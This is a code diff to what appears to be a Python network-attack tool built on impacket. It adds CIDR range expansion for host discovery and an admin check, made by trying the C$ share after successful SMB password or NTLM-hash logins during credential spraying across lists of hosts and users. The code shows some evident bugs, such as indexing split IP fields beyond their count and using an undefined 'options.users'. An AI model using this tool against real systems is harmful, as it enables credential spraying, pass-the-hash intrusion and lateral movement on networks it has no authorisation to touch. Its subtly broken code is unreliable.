@@ -1,5 +1,4 @@
 from impacket.smbconnection import SMBConnection
-from impacket import smbconnection
 from ldap3 import Server, Connection, ALL, NTLM
 import argparse
 import socket
@@ -14,9 +13,84 @@ password = ''
 nthash = ''
 mode = ''
 username = ''
+check = False
+
+# parse cidr
+def stringxor(str1, str2):
+    orxstr = ""
+    for i in range(0, len(str1)):
+        rst = int(str1[i]) & int(str2[i])
+        orxstr = orxstr + str(rst)
+    return orxstr
+
+def bin2dec(string_num):
+    return str(int(string_num, 2)) 
+
+def getip(ip, type):
+    result = ''
+    for i in range(4):
+        item = bin2dec(ip[0:8])
+        if i == 3:
+            if type == 0:
+                item = str(int(item) + 1)
+            else:
+                item = str(int(item) - 1)
+        result = result + item + '.'
+        ip = ip[8:]
+    return result.strip('.') 
+
+def CIDR(input):
+    try:
+        ip = input.split('/')[0]
+        pos = int(input.split('/')[1])
+        ipstr = ''
+        for i in ip.split('.'):
+            ipstr = ipstr + bin(int(i)).replace('0b', '').zfill(8)
+        pstr = '1' * pos + '0' * (32 - pos)
+        res = stringxor(ipstr, pstr)
+        _ip = getip(res, 0), getip(res[0:pos] + '1' * (32 - pos), 1)
+        return _ip[0] + "-" + _ip[1]
+    except:
+        return input
+
+def get_ip_list(ip):
+    ip_list_tmp = []
+    iptonum = lambda x: sum([256 ** j * int(i) for j, i in enumerate(x.split('.')[::-1])])
+    numtoip = lambda x: '.'.join([str(x / (256 ** i) % 256) for i in range(3, -1, -1)])
+    if '-' in ip:
+        ip_range = ip.split('-')
+        ip_start = int(iptonum(ip_range[0]))
+        ip_end = int(iptonum(ip_range[1]))
+        ip_count = ip_end - ip_start
+        if ip_count >= 0 and ip_count <= 655360:
+            for ip_num in range(ip_start, ip_end + 1):
+                ip_list_tmp.append(numtoip(ip_num))
+        else:
+            print('[-] wrong ip format...')
+            sys.exit(1)
+    else:
+        ip_split = ip.split('.')
+        net = len(ip_split)
+        if net == 2:
+            for b in range(1, 255):
+                for c in range(1, 255):
+                    ip = "%s.%s.%d.%d" % (ip_split[0], ip_split[1], b, c)
+                    ip_list_tmp.append(ip)
+        elif net == 3:
+            for c in range(1, 255):
+                ip = "%s.%s.%s.%d" % (ip_split[0], ip_split[1], ip_split[2], c)
+                ip_list_tmp.append(ip)
+        elif net == 4:
+            ip_list_tmp.append(ip)
+        else:
+            print('[-] wrong ip format...')
+            sys.exit(1)
+    for i in range(len(ip_list_tmp)):
+        ip_list_tmp[i] = ip_list_tmp[i].split('.')[0]+'.'+ip_list_tmp[i].split('.')[2]+'.'+ip_list_tmp[i].split('.')[4]+'.'+ip_list_tmp[i].split('.')[6]
+    return ip_list_tmp
 
 # hash spray
-def spray(username, password, nthash, target_ip, port=445):
+def spray(username, password, nthash, target_ip, check, port=445):
     if '/' in username:
         domain = username.split('/')[0]
         username = username.split('/')[1]
@@ -26,11 +100,17 @@ def spray(username, password, nthash, target_ip, port=445):
     try:
         smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
         smbClient.login(username, password=password, domain=domain, nthash=nthash)
+        if check:
+            try:
+                smbClient.connectTree('c$')
+                print('[+] {0} / user:{1}, password:{2}, hash:{3};  ....... Admin!'.format(target_ip,username,password,nthash))
+            except:
+                print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
+        #SMBConnection.close
+        else:
+            print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
         SMBConnection.close
-        print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
         return True
-    except smbconnection.SessionError as e:
-        return False
     except Exception as e:
         #print('[-] {} seems error...'.format(target_ip))
         return False
@@ -100,12 +180,12 @@ class MyThread(threading.Thread):
         self.func()
 
 def worker():
-    global mode,username,nthash,password
+    global mode,username,nthash,password,check
     if mode == 'spray':
         while not q.empty():
             (target_ip,user) = q.get()
             #i = num - q.qsize()
-            spray(user, password, nthash, target_ip)
+            spray(user, password, nthash, target_ip, check)
             time.sleep(1)
     elif mode == 'share':
         while not q.empty():
@@ -145,7 +225,9 @@ def main():
     parser.add_argument('-u', action='store', dest = "user", help='point the username')
     parser.add_argument('-P', action='store', dest = "password", help='clear words password')
     parser.add_argument('-ha', action='store', dest = "hashes", help='LM:NTLM')
+    parser.add_argument('-A', action='store_true', dest = "check", help='check if the user is admin')
     parser.add_argument('-l', action='store', dest = "computerlist", help='Computer_list')
+    parser.add_argument('-c', action='store', dest = "cidr", help='cidr,maybe x.x.x.x/24')
     parser.add_argument('-p', action='store', default='445', dest = "port", help='target_port')
     parser.add_argument('-t', action='store', default='20', dest = "thread", help='threading')
     parser.add_argument('-d', action='store', dest = "dc_ip", help='dc ip for adinfo query')
@@ -157,7 +239,7 @@ def main():
         sys.exit(1)
     options = parser.parse_args()
 
-    global mode,username,nthash,password
+    global mode,username,nthash,password,check
     mode = options.mode
     num = options.thread
     print('[*] starting u game...')
@@ -171,6 +253,8 @@ def main():
             nthash = options.hashes
         if options.hashes is None:
             password = options.password
+        if options.check:
+            check = True
         for ip in open(options.computerlist,'r').readlines():
             for user in open(options.userlist,'r').readlines():
                 q.put((ip.strip(),user.strip()))
@@ -185,26 +269,41 @@ def main():
 
     # list share
     elif options.mode == 'share':
-        if (options.password is None and options.hashes is None) or options.computerlist is None or options.user is None:
+        if options.computerlist is None:
             parser.print_help()
             sys.exit(1)
-        if options.password is None:
-            nthash = options.hashes
-        if options.hashes is None:
+        if options.password is not None:
             password = options.password
-        username = options.user
+        if options.hashes is not None:
+            nthash = options.hashes
+        if options.users is not None:
+            username = options.user
         for ip in open(options.computerlist,'r').readlines():
             q.put(ip.strip())
         start_thread(num)
     
     # parse dns and find active
-    elif options.mode == 'dns' or options.mode == 'active':
+    elif options.mode == 'dns':
         if options.computerlist is None:
             parser.print_help()
             sys.exit(1)
         for ip in open(options.computerlist,'r').readlines():
             q.put(ip.strip())
         start_thread(num)
+    
+    elif options.mode == 'active':
+        if (options.computerlist is None and options.cidr is None) or (options.computerlist is not None and options.cidr is not None):
+            parser.print_help()
+            sys.exit(1)
+        if options.computerlist is not None:
+            for ip in open(options.computerlist,'r').readlines():
+                q.put(ip.strip())
+        if options.cidr is not None:
+            for ip in get_ip_list(CIDR(options.cidr)):
+                q.put(ip.strip())
+
+        start_thread(num)
+        # x.x.x.x/24
     
     else:
         print('[-] wrong mode...')
@@ -217,7 +316,3 @@ if __name__ == '__main__':
     main()
             
         
-
-
-
-    
